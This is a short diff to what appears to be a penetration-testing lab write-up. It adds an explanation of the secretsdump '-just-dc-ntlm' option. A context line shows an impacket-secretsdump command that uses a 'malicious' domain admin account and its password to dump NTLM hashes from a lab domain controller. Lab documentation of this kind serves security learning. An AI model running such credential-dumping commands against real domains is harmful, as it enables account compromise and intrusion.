@@ -30,6 +30,6 @@ using our malicious domain admin account hawkeye against the DC, we succesfully 
 
 ![image](https://github.com/user-attachments/assets/dfe18c4b-7172-4012-8155-1c74bbd42f97)
 
-Using -just-dc-ntlm with secrets dump  
+Using -just-dc-ntlm with secretsdump will only dump out the NTDS.dit, filtering out the other data as the name implies.
 
     impacket-secretsdump MARVEL.local/hawkeye:'Password1@'@192.168.64.138 -just-dc-ntlm
